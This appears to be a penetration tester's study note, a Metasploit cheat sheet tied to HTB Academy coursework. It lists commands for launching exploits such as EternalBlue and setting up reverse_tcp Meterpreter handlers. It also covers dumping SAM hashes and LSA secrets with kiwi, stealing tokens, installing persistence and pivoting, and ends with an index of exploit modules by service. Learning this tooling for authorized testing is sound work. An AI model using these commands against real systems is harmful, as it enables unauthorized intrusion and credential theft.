# Metasploit Framework

**Tags:** `#metasploit` `#msfconsole` `#payloads` `#shells` `#postexploit`

Open-source exploitation framework with modules for exploitation, post-exploitation, pivoting, and payload generation. Uses PostgreSQL to track hosts, services, creds, and loot across an engagement.

**Source:** https://github.com/rapid7/metasploit-framework
**Install:** Pre-installed on Kali

```bash
msfconsole -q
```

> [!note]
> Staged payloads (`windows/x64/meterpreter/reverse_tcp`) require a running `multi/handler`. Stageless (`_reverse_tcp`) can connect to a plain netcat listener. Meterpreter runs in memory via DLL injection — no disk writes by default.

---

## Database Setup

```bash
sudo msfdb init
sudo msfdb status

# Reinit if broken
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

---

## Workspaces

```bash
workspace               # show current
workspace -a pentest1   # create + switch
workspace pentest1      # switch to existing
workspace -d pentest1   # delete
```

---

## Database Commands

```bash
hosts                           # discovered hosts
services                        # discovered services
creds                           # stored credentials
loot                            # collected loot

db_import nmapscan.xml          # import nmap XML
db_nmap -sV -p- -T4 10.10.10.15  # run nmap + store results
db_export -f xml backup.xml     # export DB
```

---

## Searching

```bash
search cve:2021 type:exploit platform:windows rank:excellent microsoft
search type:exploit platform:linux
search eternalblue
search type:auxiliary name:smb

# Grep payloads
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads
grep -c meterpreter show payloads       # count matches
```

---

## Module Workflow

```bash
use exploit/windows/smb/ms17_010_eternalblue
show options
show payloads
show targets
show info

set RHOSTS 10.10.10.40
set LHOST 10.10.14.5
set LPORT 4444
setg RHOSTS 10.10.10.40         # set globally across modules
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set target 0

run -j          # background job
exploit         # foreground (alias for run)
```

---

## Sessions & Jobs

```bash
sessions                    # list
sessions -i 1               # interact
sessions -u 1               # upgrade shell → meterpreter
sessions -k 1               # kill
sessions -K                 # kill all

jobs -l                     # list jobs
jobs -k 1                   # kill job
```

---

## Meterpreter

```bash
# System info
sysinfo
getuid
getpid
ps

# Filesystem
pwd; ls; cd C:\\Users
upload /local/file.exe C:\\Windows\\Temp\\file.exe
download C:\\path\\file.txt /local/

# Privilege
getsystem               # auto privesc attempt
getprivs                # list privileges
steal_token 1836        # impersonate token from PID

# Credential dumping
hashdump                # SAM hashes
load kiwi
creds_all               # dump everything via kiwi
lsa_dump_sam
lsa_dump_secrets

# Pivoting
portfwd add -l 3389 -p 3389 -r 172.16.5.10
route add 172.16.5.0/24 1   # route subnet through session 1

# Shell
shell                   # OS shell
Ctrl+Z                  # background back to meterpreter
```

---

## Post-Exploitation Modules

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/manage/persistence_exe
```

---

## Handlers

```bash
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
run -j
```

One-liner:
```bash
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.5; set LPORT 4444; set ExitOnSession false; run -j"
```

---

## Custom Module Installation

```bash
# Drop .rb file matching folder structure
cp module.rb /usr/share/metasploit-framework/modules/exploits/linux/http/mymodule.rb

# Reload inside msfconsole
reload_all
```

Naming: snake_case `.rb`. Match structure: `exploits/`, `auxiliary/`, `post/`, `payloads/`.

There may also be a `~/.msf4/modules/` folder (per-user) with the same structure — drop modules there to avoid touching the system path. Reload the entire path with `msfconsole -m /usr/share/metasploit-framework/modules/` at startup, or `reload_all` from within.

**Porting a standalone Ruby exploit into a module:** copy the `.rb` into the matching folder, then adapt it against a similar existing module — copy that module's `include` lines, then customize the `info` section (name, description, references, targets) and the `options` section (RHOSTS/RPORT/etc.) to match the new exploit.

---

> [!note] **See also** — [[Services/Cloud & Data/Flink|Apache Flink]] uses the `apache_flink_jar_upload_exec` (RCE) and `apache_flink_jobmanager_traversal` (LFI) modules; [[Services/Email/SMTP|SMTP]] uses `auxiliary/scanner/smtp/smtp_enum` and [[Services/Email/Haraka|Haraka]] uses `exploit/linux/smtp/haraka` (Harakiri, CVE-2016-1000282); [[Services/Remote Access/R-Services|R-Services]] uses the `auxiliary/scanner/rservices/{rexec,rlogin,rsh}_login` modules; [[Services/Database Services/PostgreSQL|PostgreSQL]] uses `auxiliary/scanner/postgres/{postgres_login,postgres_schemadump}` and `auxiliary/admin/postgres/postgres_sql`; [[Services/Database Services/Redis|Redis]] uses `auxiliary/scanner/redis/{redis_server,redis_login}`; [[Services/Email/IMAP|IMAP]] & [[Services/Email/POP3|POP3]] use `auxiliary/scanner/{imap/imap_login,pop3/pop3_login}`; [[Services/File Xfer/FTP|FTP]] uses `exploit/unix/ftp/vsftpd_234_backdoor` and `exploit/unix/ftp/proftpd_modcopy_exec`; [[Services/File Xfer/NFS|NFS]] uses `auxiliary/scanner/nfs/nfsmount`; [[Services/File Xfer/Rsync|Rsync]] uses `auxiliary/scanner/rsync/{modules_list,rsync_login}`; [[Services/File Xfer/TFTP|TFTP]] uses `auxiliary/scanner/tftp/tftpbrute`; [[Services/Local System Management/RPC|RPC]] & [[Services/Local System Management/WMI|WMI]] use `auxiliary/scanner/dcerpc/endpoint_mapper`; [[Services/Local System Management/WinRM|WinRM]] uses `auxiliary/scanner/winrm/{winrm_auth_methods,winrm_login}`; [[Services/Network Management/IPMI|IPMI]] uses `auxiliary/scanner/ipmi/{ipmi_version,ipmi_dumphashes,ipmi_login}`; [[Services/Web Services/Apache|Apache]] uses `exploit/multi/http/apache_normalize_path_rce` (CVE-2021-41773/42013) and `exploit/multi/http/apache_mod_cgi_bash_env_exec` (ShellShock); [[Services/Web Services/Confluence|Confluence]] uses the `atlassian_confluence_*` OGNL/SSTI RCE and `atlassian_confluence_auth_bypass_cve_2023_22518` modules; [[Services/Web Services/IIS|IIS]] uses `exploit/windows/iis/iis_webdav_upload_asp` and `iis_webdav_scstoragepathfromurl` (CVE-2017-7269); [[Services/Web Services/JDWP|JDWP]] uses `exploit/multi/misc/java_jdwp_debugger`; [[Services/Web Services/Jenkins|Jenkins]] uses `auxiliary/scanner/http/jenkins_enum`, `exploit/multi/http/jenkins_script_console` and `jenkins_metaprogramming`; [[Services/Web Services/JMX|JMX]] uses `exploit/multi/misc/java_rmi_server`; [[Services/Web Services/phpMyAdmin|phpMyAdmin]] uses `exploit/multi/http/phpmyadmin_preg_replace` and `auxiliary/scanner/http/phpmyadmin_login`; [[Services/Web Services/Tomcat|Tomcat]] uses `tomcat_mgr_login`/`tomcat_mgr_upload` and `auxiliary/admin/http/tomcat_ghostcat`; [[Services/Web Services/WebLogic|WebLogic]] uses the `weblogic_*` deserialization/console-RCE modules; [[Services/Web Services/WordPress|WordPress]] uses `exploit/unix/webapp/wp_admin_shell_upload`; [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]] (CPTS v2) uses it for stagers, meterpreter listeners, and post modules.
> Also [[Services/File Xfer/SMB|SMB]] — EternalBlue (ms17_010) and SMB aux/exploit modules.
> Also [[Services/Network Management/LDAP|LDAP]] uses `auxiliary/gather/ldap_query` and `auxiliary/scanner/ldap/ldap_login`; [[Services/Network Management/NetBIOS|NetBIOS]] uses `auxiliary/scanner/netbios/nbname`; [[Services/Network Management/NTP|NTP]] uses `auxiliary/scanner/ntp/ntp_monlist`; [[Services/Network Management/SIP-VoIP|SIP-VoIP]] uses `auxiliary/voip/*` (`sip_invite_spoof`), Asterisk AMI (`exploit/multi/misc/asterisk_ami_cmd`) and FreePBX modules; [[Services/Network Management/SNMP|SNMP]] uses `auxiliary/scanner/snmp/{snmp_login,snmp_enum,snmp_enumusers,snmp_enumshares}`; [[Services/Network Management/TLS|TLS]] uses `auxiliary/scanner/ssl/openssl_heartbleed` (DUMP/KEYS); [[Services/Remote Access/RDP|RDP]] uses `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` + `auxiliary/scanner/rdp/*`; [[Services/Remote Access/SSH|SSH]] uses `auxiliary/scanner/ssh/{ssh_login,ssh_enumusers}`; [[Services/Remote Access/Telnet|Telnet]] uses `auxiliary/scanner/telnet/{telnet_version,telnet_login}`; [[Services/Remote Access/VNC|VNC]] uses `auxiliary/scanner/vnc/{vnc_none_auth,vnc_login}` + `exploit/multi/vnc/vnc_keyboard_exec`.
> Also used in [[Techniques/LDAP Injection|LDAP Injection]], [[Class notes/HTB Academy/CPTS v2 (claude)/Metasploit|Metasploit]], [[Techniques/Network Device Pentesting|Network Device Pentesting]], [[Class notes/HTB Academy/CPTS v2 (claude)/Pivoting, Tunneling & Port Forwarding|Pivoting, Tunneling & Port Forwarding]] (autoroute / socks_proxy / portfwd) (CPTS v2).
> Also used in [[Class notes/HTB Academy/CPTS v2 (claude)/Attacking Common Applications|Attacking Common Applications]], [[Class notes/HTB Academy/CPTS v2 (claude)/Attacking Common Services|Attacking Common Services]] (CPTS v2).

---

*Created: 2026-03-13*
*Updated: 2026-09-25*
*Model: claude-opus-4-8*
